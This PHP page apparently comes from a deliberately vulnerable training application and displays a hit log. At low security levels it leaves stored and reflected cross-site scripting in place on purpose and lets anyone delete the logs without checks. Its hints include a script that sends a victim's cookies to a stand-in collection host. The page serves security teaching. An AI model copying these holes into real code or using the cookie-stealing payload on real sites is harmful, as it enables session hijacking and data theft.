
<?php
	/* Known Vulnerabilities
	 * Cross Site Scripting, Cross Site Scripting via HTTP Headers, 
	 * Denial of Service via Logging
	 */

	switch ($_SESSION["security-level"]){
   		case "0": // This code is insecure
   		case "1": // This code is insecure
   			// DO NOTHING: This is insecure		
			$lEncodeOutput = FALSE;
			$lLimitOutput= FALSE;
		break;
	    		
   		case "2":
   		case "3":
   		case "4":
   		case "5": // This code is fairly secure
  			/* 
  			 * NOTE: Input validation is excellent but not enough. The output must be
  			 * encoded per context. For example, if output is placed in HTML,
  			 * then HTML encode it. Blacklisting is a losing proposition. You 
  			 * cannot blacklist everything. The business requirements will usually
  			 * require allowing dangerous charaters. In the example here, we can 
  			 * validate username but we have to allow special characters in passwords
  			 * least we force weak passwords. We cannot validate the signature hardly 
  			 * at all. The business requirements for text fields will demand most
  			 * characters. Output encoding is the answer. Validate what you can, encode it
  			 * all.
  			 */
   			// encode the output following OWASP standards
   			// this will be HTML encoding because we are outputting data into HTML
			$lEncodeOutput = TRUE;
			
			/*
			 *  If DOS defenses are enabled, we limit output. An attacker can easily cause 
			 *  the logs to fill . This in itself may or may not pose a problem. 
			 *  But filling logs which display is a type of ampliphication attack. 
			 *  If one attacker puts 10,000 orws in the log then 10 innocent 
			 *  users view those logs, the system will have to display 100,000 log rows (10 users * 10,000 rows). 
			 *  Ampliphications attacks are also done by sending single IP packets to networks 
			 *  which will broadcast the packet thus ampliphying the packet many times.
			 */
			$lLimitOutput= TRUE;
   		break;
   	}// end switch		

   	if(isset($_GET["deleteLogs"])){
		$query = "TRUNCATE TABLE hitlog;";

		$result = $conn->query($query);
		if (!$result) {
	    	throw (new Exception('Error executing query: '.$conn->error, $conn->errorno));
	    }// end if	
	}// end if isset
?>

<!-- Bubble hints code -->
<?php 
	try{
   		$lReflectedXSSExecutionPointBallonTip = $BubbleHintHandler->getHint("ReflectedXSSExecutionPoint");
	} catch (Exception $e) {
		echo $CustomErrorHandler->FormatError($e, "Error attempting to execute query to fetch bubble hints.");
	}// end try
?>

<script type="text/javascript">
	$(function() {
		$('[ReflectedXSSExecutionPoint]').attr("title", "<?php echo $lReflectedXSSExecutionPointBallonTip; ?>");
		$('[ReflectedXSSExecutionPoint]').balloon();
	});
</script>

<div class="page-title">Log</div>

<?php include_once './includes/back-button.inc';?>

<?php
	try{// to draw table
		$query = "SELECT * FROM `hitlog` ORDER BY date DESC";
	    
		if ($lLimitOutput){
	    	$query .= " LIMIT 20";
	    }// end if
		
		$result = $conn->query($query);
		if (!$result) {
	    	throw (new Exception('Error executing query: '.$conn->error, $conn->errorno));
	    }// end if

		// we have rows. Begin drawing output.
		echo '<table border="1px" width="100%" class="main-table-frame">';
		echo '<tr class="report-header">';
		echo '	<td colspan="10">';		
		echo '		<span><img width="32px" height="32px" src="./images/information-icon-64-64.png" style="vertical-align:middle;" />'.$result->num_rows.' log records found<span>';
		echo '		<span title="Click to refresh log file" onclick="document.location.reload(true);" style="cursor: pointer;margin-left:35px;margin-right:35px;white-space:nowrap;font-weight:bold;">';
		echo '			<img width="32px" height="32px" src="./images/refresh-button-48px-by-48px.png" style="vertical-align:middle;" />';
		echo '			Refresh Logs';
		echo '		</span>';
		echo '		<span title="Click to delete log file" onclick="document.location=\'./index.php?page=show-log.php&deleteLogs=deleteLogs\';" style="cursor: pointer;white-space:nowrap;font-weight:bold;">';
		echo '			<img width="32px" height="32px" src="./images/delete-icon-256-256.png" style="vertical-align:middle;" />';
		echo '			Delete Logs';
		echo '		</span>';
		echo '	</td>';
		echo '</tr>';		
	    echo '<tr class="report-header">
			    <td style="font-weight:bold;">Hostname</td>
			    <td style="font-weight:bold;">IP</td>
			    <td style="font-weight:bold;">Browser Agent</td>
			    <td style="font-weight:bold;">Page Viewed</td>
			    <td style="font-weight:bold;">Date/Time</td>
		    </tr>';

	    if ($lLimitOutput){
	    	echo '<tr><td class="error-header" colspan="10">Note: DOS defenses enabled. Rows limited to last 20.</td></tr>';
	    }// end if

	    $lRowNumber = 0;
	    while($row = $result->fetch_object()){
	    	$lRowNumber++;
			
			if(!$lEncodeOutput){
				$lHostname = $row->hostname;
				$lClientIPAddress = $row->ip;
				$lBrowser = $row->browser;
				$lReferer = $row->referer;
				$lDate = $row->date;
			}else{
				$lHostname = $Encoder->encodeForHTML($row->hostname);
				$lClientIPAddress = $Encoder->encodeForHTML($row->ip);
				$lBrowser = $Encoder->encodeForHTML($row->browser);
				$lReferer = $Encoder->encodeForHTML($row->referer);
				$lDate = $Encoder->encodeForHTML($row->date);				
			}// end if
				
			echo "<tr>
					<td>{$lHostname}</td>
					<td>{$lClientIPAddress}</td>
					<td ReflectedXSSExecutionPoint=\"1\">{$lBrowser}</td>
					<td ReflectedXSSExecutionPoint=\"1\">{$lReferer}</td>
					<td>{$lDate}</td>
				</tr>\n";
		}//end while $row
		echo "</table>";
	} catch (Exception $e) {
		echo $CustomErrorHandler->FormatError($e, "Error writing rows.");
	}// end try;
?>

<?php
	// Begin hints section
	if ($_SESSION["showhints"]) {
		echo '
			<table>
				<tr><td class="hint-header">Hints</td></tr>
				<tr>
					<td class="hint-body">
						<ul class="hints">
						  	<li><b>For XSS:</b>XSS is easy stuff. This one shows off both reflected (you see the results 
								instantly) and stored (someone can run across it later in another app that
								uses the same database). "&lt;script&gt;alert("XSS");&lt;/script&gt;" is the classic, but 
								there are far more interesting things you could do which I plan show in a video later. 
								For some hot cookie stealing action, try something like:
<code>
&lt;script&gt;
	new Image().src="http://some-ip/mutillidae/catch.php?cookie="+encodeURI(document.cookie);
&lt;/script&gt;
</code>	
								Also, check out <a href="http://ha.ckers.org/xss.html">Rsnake\'s XSS Cheet Sheet</a>
								for more ways you can encode XSS attacks that may allow you to get around some filters.
							</li>
						  	<li>Notice the information being output. With respect to HTTP transmissions, 
						  	where do you find this information? Is any of it sent by the browser?
							</li>
							<li>The user is in complete control of the browser and all of the information it sends to the server.</li>
							<li>If the server displays any information from the browser without output encoding first, 
							shame on the developer.
							</li>
							<li>You can use the any page normally but then simply change the parameters in Tamper Data. 
							Because Tamper Data is allowing the user to manipulate the request after the request has 
							left the browser, any HTML or JavaScript has already run and is completely useless as a 
							security measure. Any use of HTML or JavaScript for security purposes is useless anyway. 
							Some developers still fail to recognize this fact to this day.
							</li>
							<li>HTTP headers including the user agent can be manipulated by client side proxies like Paros, Burp, and WebScarab.</li>
							<li>With tools like netcat, you can send custom HTTP requests any way you wish. Try using tools
							like Paros to begin altering HTTP requests, then try netcat to create your own HTTP
								requests from scratch</li>
						</ul>
					</td>
				</tr>
			</table>'; 
	}//end if ($_SESSION["showhints"])

	if ($_SESSION["showhints"] == 2) {
		include_once './includes/cross-site-scripting-tutorial.inc';
	}// end if
?>